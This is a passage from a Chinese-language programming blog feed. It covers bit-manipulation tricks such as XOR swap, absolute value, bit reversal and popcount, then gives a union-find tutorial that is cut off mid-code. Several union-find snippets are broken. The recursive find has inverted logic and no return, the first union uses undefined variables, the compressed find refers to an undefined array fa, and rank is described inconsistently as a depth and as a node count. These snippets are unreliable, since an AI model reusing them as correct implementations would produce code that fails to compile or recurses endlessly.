class="hljs-keyword">int</span> &amp;b)</span> </span>&#123;<br>    a = a + b;<br>    b = a - b;<br>    a = a - b;<br>&#125;<br><br><span class="hljs-comment">//位与操作</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> &amp;a, <span class="hljs-keyword">int</span> &amp;b)</span> </span>&#123;<br>    a ^= b;<br>    b ^= a;<br>    a ^= b;<br>&#125;<br></code></pre></td></tr></table></figure><p>位与操作解释：第一步：a ^= b —-&gt; a = (a^b); </p><p>第二步：b ^= a —-&gt; b = b^(a^b) —-&gt; b = (b^b)^a = a</p><p>第三步：a ^= b —-&gt; a = (a^b)^a = (a^a)^b = b</p><p><strong>3. 位操作判断奇偶数</strong></p><ul><li>只要根据数的最后一位是 0 还是 1 来决定即可，为 0 就是偶数，为 1 就是奇数。</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-number">0</span> == (a &amp; <span class="hljs-number">1</span>)</span></span>) &#123;<br><span class="hljs-comment">//偶数</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>4. 位操作交换符号</strong></p><ul><li>交换符号将正数变成负数，负数变成正数</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">reversal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span> </span>&#123;<br><span class="hljs-keyword">return</span> ~a + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>整数取反加1，正好变成其对应的负数(补码表示)；负数取反加一，则变为其原码，即正数</p><p><strong>5. 位操作求绝对值</strong></p><ul><li>整数的绝对值是其本身，负数的绝对值正好可以对其进行取反加一求得，即我们首先判断其符号位（整数右移 31 位得到 0，负数右移 31 位得到 -1,即 0xffffffff），然后根据符号进行相应的操作</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">abs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span> </span>&#123; <br><span class="hljs-keyword">int</span> i = a &gt;&gt; <span class="hljs-number">31</span>; <br><span class="hljs-keyword">return</span> i == <span class="hljs-number">0</span> ? a : (~a + <span class="hljs-number">1</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>上面的操作可以进行优化，可以将 i == 0 的条件判断语句去掉。我们都知道符号位 i 只有两种情况，即 i = 0 为正，i = -1 为负。对于任何数与 0 异或都会保持不变，与 -1 即 0xffffffff 进行异或就相当于对此数进行取反,因此可以将上面三目元算符转换为((a^i)-i)，即整数时 a 与 0 异或得到本身，再减去 0，负数时与 0xffffffff 异或将 a 进行取反，然后在加上 1，即减去 i(i =-1)</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">abs2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i = a &gt;&gt; <span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">return</span> ((a^i) - i);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>6. 位操作进行高低位交换</strong></p><ul><li>给定一个 16 位的无符号整数，将其高 8 位与低 8 位进行交换，求出交换后的值，如：</li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">34520</span>的二进制表示：<br><span class="hljs-number">10000110</span> <span class="hljs-number">11011000</span><br><br>将其高<span class="hljs-number">8</span>位与低<span class="hljs-number">8</span>位进行交换，得到一个新的二进制数：<br><span class="hljs-number">11011000</span> <span class="hljs-number">10000110</span><br>其十进制为<span class="hljs-number">55430</span><br></code></pre></td></tr></table></figure><p>从上面移位操作我们可以知道，只要将无符号数 a&gt;&gt;8 即可得到其高 8 位移到低 8 位，高位补 0；将 a&lt;<8 即可将 低 8 位移到高 8 位，低 8 位补 0，然后将 a>&gt;8 和 a&lt;&lt;8 进行或操作既可求得交换后的结果。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">unsigned short a</span> = 34520; <br><span class="hljs-attribute">a</span> = (a &gt;&gt; 8) | (a &lt;&lt; 8);<br></code></pre></td></tr></table></figure><p><strong>7. 位操作进行二进制逆序</strong></p><p>将无符号数的二进制表示进行逆序，求取逆序后的结果，如</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">数<span class="hljs-number">34520</span>的二进制表示：<br><span class="hljs-number">10000110</span> <span class="hljs-number">11011000</span><br><br>逆序后则为：<br><span class="hljs-number">00011011</span> <span class="hljs-number">01100001</span><br>它的十进制为<span class="hljs-number">7009</span><br></code></pre></td></tr></table></figure><p>在字符串逆序过程中，可以从字符串的首尾开始，依次交换两端的数据。在二进制中使用位的高低位交换会更方便进行处理，这里我们分组进行多步处理。</p><ul><li>第一步:以每 2 位为一组，组内进行高低位交换</li></ul><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">交换前：<span class="hljs-number"> 10 </span>00<span class="hljs-number"> 01 </span>10<span class="hljs-number"> 11 </span>01<span class="hljs-number"> 10 </span>00 <br>交换后：<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 10 </span>01<span class="hljs-number"> 11 </span>10<span class="hljs-number"> 01 </span>00<br></code></pre></td></tr></table></figure><ul><li>第二步：在上面的基础上，以每 4 位为 1 组，组内高低位进行交换</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">交换前：</span> <span class="hljs-number">0100 </span><span class="hljs-number">1001 </span><span class="hljs-number">1110 </span><span class="hljs-number">0100</span> <br><span class="hljs-string">交换后：</span> <span class="hljs-number">0001 </span><span class="hljs-number">0110 </span><span class="hljs-number">1011 </span><span class="hljs-number">0001</span><br></code></pre></td></tr></table></figure><ul><li>第三步：以每 8 位为一组，组内高低位进行交换</li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">交换前： <span class="hljs-number">00010110</span> <span class="hljs-number">10110001</span> <br>交换后： <span class="hljs-number">01100001</span> <span class="hljs-number">00011011</span><br></code></pre></td></tr></table></figure><ul><li>第四步：以每16位为一组，组内高低位进行交换</li></ul><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">交换前：<span class="hljs-number"> 0110000100011011 </span><br>交换后： 0001101101100001<br></code></pre></td></tr></table></figure><p>对于上面的第一步，依次以 2 位作为一组，再进行组内高低位交换，这样处理起来比较繁琐，下面介绍另外一种方法进行处理。先分别取原数 10000110 11011000 的奇数位和偶数位，将空余位用 0 填充：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">原数： <span class="hljs-number">10000110</span> <span class="hljs-number">11011000</span><br>奇数位： <span class="hljs-number">10000010</span> <span class="hljs-number">10001000</span><br>偶数位： <span class="hljs-number">00000100</span> <span class="hljs-number">01010000</span><br></code></pre></td></tr></table></figure><p>再将奇数位右移一位，偶数位左移一位，此时将两个数据相或即可以达到奇偶位上数据交换的效果：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">原数： <span class="hljs-number">10000110</span> <span class="hljs-number">11011000</span><br>奇数位右移一位： <span class="hljs-number">0 10000010</span> <span class="hljs-number">1000100</span><br>偶数位左移一位：<span class="hljs-number">0000100</span> <span class="hljs-number">01010000 0</span><br>两数相或得到： <span class="hljs-number">01001001</span> <span class="hljs-number">11100100</span><br></code></pre></td></tr></table></figure><p>上面的方法用位操作可以表示为：</p><ul><li><p>取a的奇数位并用 0 进行填充可以表示为：a &amp; 0xAAAA</p></li><li><p>取a的偶数为并用 0 进行填充可以表示为：a &amp; 0x5555 因此，上面的第一步可以表示为： </p><p>a = ((a &amp; 0xAAAA) &gt;&gt; 1) | ((a &amp; 0x5555) &lt;&lt; 1) </p><p>同理，可以得到其第二、三和四步为：</p><p>a = ((a &amp; 0xCCCC) &gt;&gt; 2) | ((a &amp; 0x3333) &lt;&lt; 2) </p><p>a = ((a &amp; 0xF0F0) &gt;&gt; 4) | ((a &amp; 0x0F0F) &lt;&lt; 4) </p><p>a = ((a &amp; 0xFF00) &gt;&gt; 8) | ((a &amp; 0x00FF) &lt;&lt; 8) 因此整个操作为：</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">unsigned <span class="hljs-keyword">short</span> a = <span class="hljs-number">34520</span>;<br><br>a = ((a &amp; <span class="hljs-number">0xAAAA</span>) &gt;&gt; <span class="hljs-number">1</span>) | ((a &amp; <span class="hljs-number">0x5555</span>) &lt;&lt; <span class="hljs-number">1</span>);<br>a = ((a &amp; <span class="hljs-number">0xCCCC</span>) &gt;&gt; <span class="hljs-number">2</span>) | ((a &amp; <span class="hljs-number">0x3333</span>) &lt;&lt; <span class="hljs-number">2</span>);<br>a = ((a &amp; <span class="hljs-number">0xF0F0</span>) &gt;&gt; <span class="hljs-number">4</span>) | ((a &amp; <span class="hljs-number">0x0F0F</span>) &lt;&lt; <span class="hljs-number">4</span>);<br>a = ((a &amp; <span class="hljs-number">0xFF00</span>) &gt;&gt; <span class="hljs-number">8</span>) | ((a &amp; <span class="hljs-number">0x00FF</span>) &lt;&lt; <span class="hljs-number">8</span>);<br></code></pre></td></tr></table></figure><p><strong>8. 位操作统计二进制中 1 的个数</strong></p><p>统计二进制1的个数可以分别获取每个二进制位数，然后再统计其1的个数，此方法效率比较低。这里介绍另外一种高效的方法，同样以 34520 为例，我们计算其 a &amp;= (a-1)的结果：</p><ul><li>第一次：计算前：1000 0110 1101 1000 计算后：1000 0110 1101 0000</li><li>第二次：计算前：1000 0110 1101 0000 计算后：1000 0110 1100 0000</li><li>第二次：计算前：1000 0110 1100 0000 计算后：1000 0110 1000 0000 我们发现，没计算一次二进制中就少了一个 1，则我们可以通过下面方法去统计：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">count = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">while</span>(a)&#123;  <br>a = a &amp; (a - <span class="hljs-number">1</span>);  <br>count++;  <br>&#125;  <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">位运算的相关技巧</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="位运算" scheme="http://example.com/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>设计</title>
    <link href="http://example.com/2021/03/11/%E8%AE%BE%E8%AE%A1/"/>
    <id>http://example.com/2021/03/11/%E8%AE%BE%E8%AE%A1/</id>
    <published>2021-03-11T11:52:53.000Z</published>
    <updated>2021-03-11T11:56:48.006Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-并查集"><a href="#1-并查集" class="headerlink" title="1. 并查集"></a>1. 并查集</h1><h2 id="1-1-并查集详解"><a href="#1-1-并查集详解" class="headerlink" title="1.1 并查集详解"></a>1.1 并查集详解</h2><p>Union-Find 算法，也就是常说的并查集算法，主要是解决图论中「动态连通性」问题。</p><p>开始参考的labuladong，发现平衡优化和路径压缩有问题，并查集参考：</p><p><a href="https://zhuanlan.zhihu.com/p/93647900">https://zhuanlan.zhihu.com/p/93647900</a></p><h3 id="1-1-1-问题介绍"><a href="#1-1-1-问题介绍" class="headerlink" title="1.1.1 问题介绍"></a>1.1.1 问题介绍</h3><p>简单说，动态连通性其实可以抽象成给一幅图连线。比如下面这幅图，总共有 10 个节点，他们互不相连，分别用 0~9 标记：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集1.jpg" alt="并查集1" style="zoom:50%;" /></p><p>现在我们的 Union-Find 算法主要需要实现这两个 API：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UF</span> </span>&#123;<br>    <span class="hljs-comment">/* 将 p 和 q 连接 */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">union</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p, <span class="hljs-keyword">int</span> q)</span></span>;<br>    <span class="hljs-comment">/* 判断 p 和 q 是否连通 */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">connected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p, <span class="hljs-keyword">int</span> q)</span></span>;<br>    <span class="hljs-comment">/* 返回图中有多少个连通分量 */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">count</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里所说的「连通」是一种等价关系，也就是说具有如下三个性质：</p><p>1、自反性：节点<code>p</code>和<code>p</code>是连通的。</p><p>2、对称性：如果节点<code>p</code>和<code>q</code>连通，那么<code>q</code>和<code>p</code>也连通。</p><p>3、传递性：如果节点<code>p</code>和<code>q</code>连通，<code>q</code>和<code>r</code>连通，那么<code>p</code>和<code>r</code>也连通。</p><p>比如说之前那幅图，0～9 任意两个<strong>不同</strong>的点都不连通，调用<code>connected</code>都会返回 false，连通分量为 10 个。</p><p>如果现在调用<code>union(0, 1)</code>，那么 0 和 1 被连通，连通分量降为 9 个。</p><p>再调用<code>union(1, 2)</code>，这时 0,1,2 都被连通，调用<code>connected(0, 2)</code>也会返回 true，连通分量变为 8 个。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集2.jpg" alt="并查集2" style="zoom:50%;" /></p><p>判断这种「等价关系」非常实用，比如说编译器判断同一个变量的不同引用，比如社交网络中的朋友圈计算等等。</p><p>这样，你应该大概明白什么是动态连通性了，Union-Find 算法的关键就在于<code>union</code>和<code>connected</code>函数的效率。那么用什么模型来表示这幅图的连通状态呢？用什么数据结构来实现代码呢？</p><h3 id="1-1-2-基本思路"><a href="#1-1-2-基本思路" class="headerlink" title="1.1.2 基本思路"></a>1.1.2 基本思路</h3><p>注意我刚才把「模型」和具体的「数据结构」分开说，这么做是有原因的。因为我们使用森林（若干棵树）来表示图的动态连通性，用数组来具体实现这个森林。</p><p>怎么用森林来表示连通性呢？我们设定树的每个节点有一个指针指向其父节点，如果是根节点的话，这个指针指向自己。比如说刚才那幅 10 个节点的图，一开始的时候没有相互连通，就是这样：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集3.jpg" alt="并查集3" style="zoom:50%;" /></p><p><strong>初始化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UF</span> </span>&#123;<br>    <span class="hljs-comment">// 记录连通分量</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> count;<br>    <span class="hljs-comment">// 节点 x 的节点是 parent[x]</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] parent;<br><br>    <span class="hljs-comment">/* 构造函数，n 为图的节点总数 */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">UF</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span class="hljs-comment">// 一开始互不连通</span><br>        <span class="hljs-keyword">this</span>.count = n;<br>        <span class="hljs-comment">// 父节点指针初始指向自己</span><br>        parent = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>            parent[i] = i;<br>    &#125;<br><br>    <span class="hljs-comment">/* 其他函数 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>如果某两个节点被连通，则让其中的（任意）一个节点的根节点接到另一个节点的根节点上</strong>：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集4.jpg" alt="并查集4" style="zoom:50%;" /></p><p><strong>查询</strong></p><p>递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* 返回某个节点 x 的根节点 */</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-comment">// 根节点的 parent[x] == x</span><br>    <span class="hljs-keyword">if</span> (parent[x] != x)<br>        x = parent[x];<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> find(parent[x]);<br>&#125;<br></code></pre></td></tr></table></figure><p>迭代：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* 返回某个节点 x 的根节点 */</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-comment">// 根节点的 parent[x] == x</span><br>    <span class="hljs-keyword">while</span> (parent[x] != x)<br>        x = parent[x];<br>    <span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></td></tr></table></figure><p>合并：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">union</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p, <span class="hljs-keyword">int</span> q)</span> </span>&#123;<br>    <span class="hljs-comment">// 将两棵树合并为一棵</span><br>    parent[rootP] = find(rootQ);<br>    count--; <span class="hljs-comment">// 两个分量合二为一</span><br>&#125;<br><br><span class="hljs-comment">/* 返回当前的连通分量个数 */</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">count</span><span class="hljs-params">()</span> </span>&#123; <br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这样，如果节点<code>p</code>和<code>q</code>连通的话，它们一定拥有相同的根节点</strong>：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集5.jpg" alt="并查集5" style="zoom:50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">connected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p, <span class="hljs-keyword">int</span> q)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rootP = find(p);<br>    <span class="hljs-keyword">int</span> rootQ = find(q);<br>    <span class="hljs-keyword">return</span> rootP == rootQ;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，Union-Find 算法就基本完成了。是不是很神奇？竟然可以这样使用数组来模拟出一个森林，如此巧妙的解决这个比较复杂的问题！</p><p>那么这个算法的复杂度是多少呢？我们发现，主要 API<code>connected</code>和<code>union</code>中的复杂度都是<code>find</code>函数造成的，所以说它们的复杂度和<code>find</code>一样。</p><p><code>find</code>主要功能就是从某个节点向上遍历到树根，其时间复杂度就是树的高度。我们可能习惯性地认为树的高度就是<code>logN</code>，但这并不一定。<code>logN</code>的高度只存在于平衡二叉树，对于一般的树可能出现极端不平衡的情况，使得「树」几乎退化成「链表」，树的高度最坏情况下可能变成<code>N</code>。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集6.jpg" alt="并查集6" style="zoom:50%;" /></p><p>所以说上面这种解法，<code>find</code>,<code>union</code>,<code>connected</code>的时间复杂度都是 O(N)。这个复杂度很不理想的，你想图论解决的都是诸如社交网络这样数据规模巨大的问题，对于<code>union</code>和<code>connected</code>的调用非常频繁，每次调用需要线性时间完全不可忍受。</p><p><strong>问题的关键在于，如何想办法避免树的不平衡呢</strong>？只需要略施小计即可。</p><h3 id="1-1-3-路径压缩"><a href="#1-1-3-路径压缩" class="headerlink" title="1.1.3 路径压缩"></a>1.1.3 路径压缩</h3><p>这步优化特别简单，所以非常巧妙。我们能不能进一步压缩每棵树的高度，使树高始终保持为常数？</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集8.jpg" alt="并查集8" style="zoom:50%;" /></p><p>这样<code>find</code>就能以 O(1) 的时间找到某一节点的根节点，相应的，<code>connected</code>和<code>union</code>复杂度都下降为 O(1)。</p><p>既然我们只关心一个元素对应的<strong>根节点</strong>，那我们希望每个元素到根节点的路径尽可能短，最好只需要一步,其实这说来也很好实现。只要我们在查询的过程中，<strong>把沿途的每个节点的父节点都设为根节点</strong>即可。</p><p>递归方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(x == parent[x])<br>        <span class="hljs-keyword">return</span> x;<br>    <span class="hljs-keyword">else</span>&#123;<br>        parent[x] = find(fa[x]);  <span class="hljs-comment">//父节点设为根节点</span><br>        <span class="hljs-keyword">return</span> parent[x];         <span class="hljs-comment">//返回父节点</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简写为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> x == parent[x] ? x : (parent[x] = find(fa[x]));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-1-4-平衡性优化"><a href="#1-1-4-平衡性优化" class="headerlink" title="1.1.4 平衡性优化"></a>1.1.4 平衡性优化</h3><p>有些人可能有一个误解，以为路径压缩优化后，并查集始终都是一个<strong>菊花图</strong>（只有两层的树的俗称）。但其实，由于路径压缩只在查询时进行，也只压缩一条路径，所以并查集最终的结构仍然可能是比较复杂的。</p><p>我们要知道哪种情况下可能出现不平衡现象，关键在于<code>union</code>过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">union</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p, <span class="hljs-keyword">int</span> q)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rootP = find(p);<br>    <span class="hljs-keyword">int</span> rootQ = find(q);<br>    <span class="hljs-keyword">if</span> (rootP == rootQ)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 将两棵树合并为一棵</span><br>    parent[rootP] = rootQ;<br>    <span class="hljs-comment">// parent[rootQ] = rootP 也可以</span><br>    count--;<br></code></pre></td></tr></table></figure><p>我们一开始就是简单粗暴的把<code>p</code>所在的树接到<code>q</code>所在的树的根节点下面，那么这里就可能出现「头重脚轻」的不平衡状况，比如下面这种局面：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集7.jpg" alt="并查集7" style="zoom:50%;" /></p><p>长此以往，树可能生长得很不平衡。<strong>我们其实是希望，小一些的树接到大一些的树下面，这样就能避免头重脚轻，更平衡一些</strong>。</p><p>解决方法是我们用一个数组rank[]记录每个根节点对应的树的深度（如果不是根节点，其rank相当于以它作为根节点的<strong>子树</strong>的深度）。一开始，把所有元素的rank（<strong>秩</strong>）设为1。合并时比较两个根节点，把rank较小者往较大者上合并。路径压缩和按秩合并如果一起使用，时间复杂度接近 O(n)，但是很可能会破坏rank的准确性。</p><p>初始化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">inline <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i)<br>    &#123;<br>        parent[i] = i;<br>        rank[i] = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>比如说<code>rank[3] = 5</code>表示，以节点<code>3</code>为根的那棵树，总共有<code>5</code>个节点。这样我们可以修改一下<code>union</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">union</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p, <span class="hljs-keyword">int</span> q)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rootP = find(p);<br>    <span class="hljs-keyword">int</span> rootQ = find(q);<br>    <span class="hljs-keyword">if</span> (rootP == rootQ)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">// 小树接到大树下面，较平衡</span><br>    <span class="hljs-keyword">if</span> (rank[rootP] &lt;= rank[rootQ]) &#123;<br>        parent[rootP] = rootQ;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        parent[rootQ] = rootP;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (rank[rootP] == rank[rootQ] &amp;&amp; rootP != 